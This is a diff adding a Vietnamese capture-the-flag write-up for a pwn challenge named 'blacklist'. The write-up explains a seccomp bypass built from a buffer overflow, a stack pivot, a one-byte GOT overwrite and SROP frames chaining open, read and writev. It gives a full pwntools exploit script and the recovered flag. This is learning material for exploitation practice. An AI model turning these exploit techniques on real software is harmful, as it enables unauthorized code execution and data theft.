@@ -202,5 +202,222 @@ io.sendlineafter(b">", b"1")
 io.sendline(str(len(shellcode)).encode())
 io.send(shellcode)
 
+io.sendlineafter(b">", b"2")
 io.interactive()
 ```
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/c874782d-499b-4c2a-b9a4-54bee824e3c7)
+
+## blacklist
+
+Đây là một bài syscall bypass, chặn các syscall `execve`, `execveat`, `write`, `pwritev`, `pwritev2`, `pwrite64`, `mprotect`, `kill`, `tkill`. Ta nhanh chóng nhận ra ta sẽ có đủ 3 syscall (`open`, `read`, `writev`) để read flag, giờ việc còn lại sẽ là tìm cơ hội để dùng 3 syscall này.
+
+Bài này thì ta sẽ có một bug buffer overflow 48-32=16 byte overflow, vừa đủ để override return address và control được RIP, tuy nhiên có vài vấn đề:
+- Không có memory leak
+- Binary không có syscall instruction
+
+Binary được compile với no pie, do đó việc đầu tiên ta nghĩ đến hẳn sẽ là tìm cách để stack pivot lên một vùng memory RW của binary, thường là `.bss`. Một cách mà ta có thể dùng là gadget `leave, ret`
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/2a45ba6a-0dba-4090-911c-13a6fbde4a40)
+
+buffer bị overflow bắt đầu tại `a60`, sau lệnh leave của main thì RBP sẽ là giá trị tại `a80`, ta có thể đưa địa chỉ của .bss vào để pivot stack. Ở đây ta có thể control RIP về `0x401469`
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5c12d8f1-b4f1-42d4-b33d-3e33ea918668)
+
+Do ta đã control RBP, với gadget này ta sẽ thực hiện ghi 48 byte đến `RBP-0x20` trước rồi sau đó mới thực hiện leave để pivot lên .bss. Giờ đây ta cần giải quyết vấn đề tiếp theo, ta có thể ROP nhưng thiếu đi gadget `syscall`, sau khi kiểm tra các GOT entry thì mình phát hiện là nếu ta ghi đè 1 byte đầu của alarm@got thì ta sẽ có thể có được `syscall` instruction, tuy không biết libc nhưng việc bruteforce 0xff thì không khó. Sau khi có instruction `syscall` thì mình nghĩ đến dùng `read` để control rax và dùng sigreturn để để gọi đến lần lượt 3 syscall `open`, `read`, `writev`. Thông qua bruteforce thì mình biết được byte cần ghi để biến instruction tại alarm@got thành `syscall` là `\x0b`, cách mình bruteforce là mình sẽ canh để ghi ghi 1 byte vào alarm@got xong thì nó sẽ return về đúng địa chỉ đó luôn, vì `main+66` là lệnh `mov eax, 0` nên chắc chắn lúc đó rax sẽ là `0x0`.
+
+![image](https://github.com/CP04042K/cp04042k.github.io/assets/35491855/4b9cdfa6-36c4-42cc-81ba-90ba0ea47036)
+
+Nếu như alarm@got lúc này đúng là syscall thì nó sẽ gọi đến syscall `read` và bị delay, ngay sau alarm@got sẽ là read@got, do đó mà chương trình sẽ tiếp tục wait for input và bị delay thêm một lần thứ 2, đây sẽ là dấu hiệu để ta xác định được rằng byte ta ghi đã đúng chưa.
+
+Sau khi có `syscall` rồi thì bây giờ ta chỉ cần setup 3 sigreturn frame và thực hiện sigreturn để control các register và gọi đến các syscall `open`, `read`, `writev` nữa là được
+
+```py
+from pwn import *
+from pwn import u64, u32, p64, p32, unpack, asm
+
+# PwnableVN{n0_m0r3_cSu_Wh!t3L!5T_Is_b3tT3r}
+
+if args.REMOTE:
+    io = remote("blacklist.pwnable.vn", 31337)
+
+else:
+    io = process("./sym")
+
+
+exe = ELF("./sym")
+main = 0x000000000040143d
+ret = 0x401485
+
+
+mis_aligned_read = 0x0000000000401469
+pivot_bss_addr = 0x4040a8
+pivot_2 = 0x404168+40
+pivot_3 = 0x4042b8
+pivot_4 = 0x404430
+signal_got = 0x404058
+alarm_got = 0x404028
+leave_ret = 0x0000000000401484
+ret = 0x0000000000401485
+pop_rbp = 0x000000000040123d
+jmp_rax = 0x40120e
+sig_frame = 0x4041c0
+sig_frame_2 = 0x4042b8+8+8*6
+sig_frame_3 = 0x404430+8+8*6
+
+SYS_open = p64(2)
+SYS_read = p64(0)
+SYS_writev = p64(20)
+flag_str = p64(0x404020)
+next_rip = p64(ret)
+next_rbp = p64(0x404280) 
+next_rsp = p64(0x404280) # straight to planned syscall
+O_RDONLY = p64(0)
+FLAGS = p64(0)
+
+io.recvuntil(b"flag\n")
+# io = process("./blacklist")
+# write to signal got 
+pause()
+io.send(b"A"*32 + p64(pivot_bss_addr+0x20) + p64(mis_aligned_read))
+io.send(b"F"*16 + flag_str + O_RDONLY + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+4*8+0x18+0x20)*2 + p64(mis_aligned_read))
+io.send(next_rbp + b"A"*8*3 + p64(signal_got+0x20) +  p64(mis_aligned_read))
+
+# setup sigframe 1
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+8+0x10+0x20)*2 + p64(mis_aligned_read))
+io.send(b"F"*16 + flag_str + O_RDONLY + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+8*4+0x18+0x10+0x20)*2 + p64(mis_aligned_read))
+io.send(FLAGS + SYS_open + b"A"*8 + next_rsp + p64(signal_got+0x20) +  p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20)*2 + p64(mis_aligned_read))
+io.send(next_rip + b"2"*8 + b"3"*16 + p64(signal_got+0x20) +  p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20+16)*2 + p64(mis_aligned_read))
+io.send(p64(0x33) + b"4"*16 + p64(0x2b) + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20+40+8)*2 + p64(mis_aligned_read))
+io.send(b"\x00"*8*4 + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame+6*8+0x18+0x20+0x20+40+8+40)*2 + p64(mis_aligned_read))
+io.send(p64(exe.plt["alarm"]) + p64(pop_rbp) + p64(0x4042d8) + p64(mis_aligned_read) + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+# setup sigframe 2
+fd = p64(3)
+buf = p64(0x404020)
+count = p64(8)
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+8+0x10+0x20-8)*2 + p64(mis_aligned_read))
+io.send(b"F"*16 + fd + buf + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+8*4+0x18+0x10+0x20-8)*2 + p64(mis_aligned_read))
+io.send(count + SYS_read + b"A"*8 + next_rsp + p64(signal_got+0x20) +  p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20-8)*2 + p64(mis_aligned_read))
+io.send(next_rip + b"2"*8 + b"3"*16 + p64(signal_got+0x20) +  p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20+16-8)*2 + p64(mis_aligned_read))
+io.send(p64(0x33) + b"4"*16 + p64(0x2b) + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20+40+8-8)*2 + p64(mis_aligned_read))
+io.send(b"\x00"*8*4 + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_2+6*8+0x18+0x20+0x20+40+8+40)*2 + p64(mis_aligned_read))
+io.send(p64(exe.plt["alarm"]) + p64(pop_rbp) + p64(pivot_4+0x20) + p64(mis_aligned_read) + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+# setup sigframe 3
+iovec = buf + count
+io_vec_addr = p64(0x404478)
+fd = p64(1) # stdout
+vlen = p64(1) # vector count, we have 1
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+8+0x10+0x20-8)*2 + p64(mis_aligned_read))
+io.send(iovec + fd + io_vec_addr + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+8*4+0x18+0x10+0x20-8)*2 + p64(mis_aligned_read))
+io.send(vlen + SYS_writev + b"A"*8 + next_rsp + p64(signal_got+0x20) +  p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20-8)*2 + p64(mis_aligned_read))
+io.send(next_rip + b"2"*8 + b"3"*16 + p64(signal_got+0x20) +  p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20+16-8)*2 + p64(mis_aligned_read))
+io.send(p64(0x33) + b"4"*16 + p64(0x2b) + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20+40+8-8)*2 + p64(mis_aligned_read))
+io.send(b"\x00"*8*4 + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+pause()
+io.send(p64(pop_rbp) + p64(0x404040) + p64(leave_ret) + p64(sig_frame_3+6*8+0x18+0x20+0x20+40+8+40)*2 + p64(mis_aligned_read))
+io.send(p64(exe.plt["alarm"]) + p64(pop_rbp) + p64(0x4042d8) + p64(mis_aligned_read) + p64(signal_got+0x20) + p64(mis_aligned_read))
+
+# 1-byte overwrite
+pause()
+io.send(p64(pop_rbp) + p64(pivot_2) + p64(mis_aligned_read) + p64(alarm_got+0x20-8)*2 + p64(mis_aligned_read))
+io.send(p64(0x4040a8+0x20)*5 + b"\x0b")
+
+pause()
+io.send(b"AAA")
+pause()
+io.send(b"/flag" + b"\x00"*10)
+
+
+pause()
+io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(sig_frame) + p64(mis_aligned_read))
+
+# trigger sigreturn
+pause()
+io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_2-32-8) + p64(mis_aligned_read))
+pause()
+io.send(b"AAA")
+
+pause()
+io.send(b"/flag" + b"\x00"*10)
+
+pause()
+io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_3) + p64(mis_aligned_read))
+
+#trigger sigreturn
+pause()
+io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_3-32-8) + p64(mis_aligned_read))
+pause()
+io.send(b"AAA")
+
+pause()
+io.send(b"/flag" + b"\x00"*10)
+
+pause()
+io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_4) + p64(mis_aligned_read))
+
+#trigger sigreturn
+pause()
+io.send(p64(exe.plt["read"]) + p64(exe.plt["alarm"]) + p64(mis_aligned_read) + b"A"*8 + p64(pivot_4-32-8) + p64(mis_aligned_read))
+pause()
+io.send(b"AAA")
+
+pause()
+io.send(b"/flag" + b"\x00"*10)
+
+io.interactive()
+```
+
+Một cách khác đó là ta có thể dùng syscall `mmap` để tạo ra một vùng nhớ RWX, sau đó ghi shellcode vào và chạy. 
